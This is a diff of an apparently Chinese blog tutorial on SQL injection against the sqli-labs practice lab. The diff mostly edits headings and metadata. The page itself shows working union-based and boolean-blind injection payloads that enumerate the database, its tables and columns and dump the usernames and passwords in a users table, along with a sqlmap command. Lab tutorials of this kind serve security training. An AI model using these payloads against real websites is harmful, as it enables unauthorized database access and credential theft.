@@ -42,7 +42,7 @@
 <meta property="og:image" content="https://gitee.com/fogpost/photo/raw/master/202411241654803.png">
 <meta property="og:image" content="https://gitee.com/fogpost/photo/raw/master/202411241703198.png">
 <meta property="article:published_time" content="2024-11-24T09:12:33.000Z">
-<meta property="article:modified_time" content="2024-11-24T09:12:52.971Z">
+<meta property="article:modified_time" content="2024-11-24T09:20:23.598Z">
 <meta property="article:author" content="fogpost">
 <meta property="article:tag" content="sql">
 <meta name="twitter:card" content="summary_large_image">
@@ -240,7 +240,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          2.3k 字
+          2.4k 字
         
       </span>
     
@@ -298,7 +298,7 @@
 <p>version():查看数据库版本<br>database():查看使用的数据库<br>user():查看当前用户<br>limit:limit子句分批来获取所有数据<br>group_concat():一次性获取所有的数据库信息</p>
 <p>information_schema.tables:包含了数据库里所有的表<br>table_name:表名<br>table_schema:数据库名<br>column_name:字段名</p>
 <p>–dbs:是查看所有的数据库<br>–tables:是查看所有的表<br>–columns:是查看表中所有的字段名<br>–dump:是查询哪个表的数据</p>
-<h1 id="less-1"><a href="#less-1" class="headerlink" title="less-1"></a>less-1</h1><h2 id="手工注入"><a href="#手工注入" class="headerlink" title="手工注入"></a>手工注入</h2><ol>
+<h1 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a>联合注入</h1><h2 id="手工注入"><a href="#手工注入" class="headerlink" title="手工注入"></a>手工注入</h2><ol>
 <li>首先我们输入1，发现返回正常输入?id&#x3D;1’，返回错误，说明存在单引号注入<br><img src="https://gitee.com/fogpost/photo/raw/master/202410060247359.png" srcset="/img/loading.gif" lazyload></li>
 <li>输入?id&#x3D;1’ and ‘1’&#x3D;’1，页面回显正常<br><img src="https://gitee.com/fogpost/photo/raw/master/202410060248949.png" srcset="/img/loading.gif" lazyload></li>
 <li>构造?id&#x3D;1’ and ‘1’&#x3D;’1’ order by 1–+　　页面回显正常<br>?id&#x3D;1’ and ‘1’&#x3D;’1’ order by 2–+　　页面回显正常<br>?id&#x3D;1’ and ‘1’&#x3D;’1’ order by 3–+　　页面回显正常<br>?id&#x3D;1’ and ‘1’&#x3D;’1’ order by 4–+　　出现报错界面<br><img src="https://gitee.com/fogpost/photo/raw/master/202410060250107.png" srcset="/img/loading.gif" lazyload><br>所以我们了解到了数据库表只有三列，确定了字段数</li>
@@ -306,11 +306,9 @@
 <li>构造?id&#x3D;-1’ union select 1,database(),version()–+发现回显了数据库名称和版本信息<br><img src="https://gitee.com/fogpost/photo/raw/master/202410060256922.png" srcset="/img/loading.gif" lazyload></li>
 <li>构造?id&#x3D;-1’ union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()–+发现回显了数据库中的表名<br><img src="https://gitee.com/fogpost/photo/raw/master/202410060259924.png" srcset="/img/loading.gif" lazyload></li>
 <li>查询users的字段名?id&#x3D;-1’ union select 1,2,group_concat(column_name)from information_schema.columns where table_name&#x3D;’users’–+<br><img src="https://gitee.com/fogpost/photo/raw/master/202410060302469.png" srcset="/img/loading.gif" lazyload></li>
-<li>查询users表中的内容-1’ union select 1,2,group_concat(0x5c,username,0x5c,password) from users –+ 0x5c是反斜杠的十六进制，用于连接这两个库的数据内容</li>
+<li>查询users表中的内容-1’ union select 1,2,group_concat(0x5c,username,0x5c,password) from users –+ 0x5c是反斜杠的十六进制，用于连接这两个库的数据内容<br>这个是手工注入的基本，大部分的注入都是围绕上面来优化的</li>
 </ol>
-<h2 id="sqlmap注入"><a href="#sqlmap注入" class="headerlink" title="sqlmap注入"></a>sqlmap注入</h2><ol>
-<li>sqlmap -u <a target="_blank" rel="noopener" href="http://sql/sqli-labs-master/Less-1/">http://sql/sqli-labs-master/Less-1/</a> –dbs 查看对应的库</li>
-</ol>
+<h2 id="sqlmap注入"><a href="#sqlmap注入" class="headerlink" title="sqlmap注入"></a>sqlmap注入</h2><p>sqlmap -u <a target="_blank" rel="noopener" href="http://sql/sqli-labs-master/Less-1/id=1">http://sql/sqli-labs-master/Less-1/id=1</a> –dbs 查看对应的库<br>之后还会专门出一个sqlmap的教程，这里就不多说了</p>
 <h1 id="bool盲注"><a href="#bool盲注" class="headerlink" title="bool盲注"></a>bool盲注</h1><p>?id&#x3D;1’and length((select database()))&gt;9–+<br>#大于号可以换成小于号或者等于号，主要是判断数据库的长度。lenfth()是获取当前数据库名的长度。如果数据库是haha那么length()就是4<br>?id&#x3D;1’and ascii(substr((select database()),1,1))&#x3D;115–+<br>#substr(“78909”,1,1)&#x3D;7 substr(a,b,c)a是要截取的字符串，b是截取的位置，c是截取的长度。布尔盲注我们都是长度为1因为我们要一个个判断字符。ascii()是将截取的字符转换成对应的ascii吗，这样我们可以很好确定数字根据数字找到对应的字符。</p>
 <p>?id&#x3D;1’and length((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()))&gt;13–+<br>判断所有表名字符长度。<br>?id&#x3D;1’and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),1,1))&gt;99–+<br>逐一判断表名</p>
 <p>?id&#x3D;1’and length((select group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’users’))&gt;20–+<br>判断所有字段名的长度<br>?id&#x3D;1’and ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’users’),1,1))&gt;99–+<br>逐一判断字段名。</p>
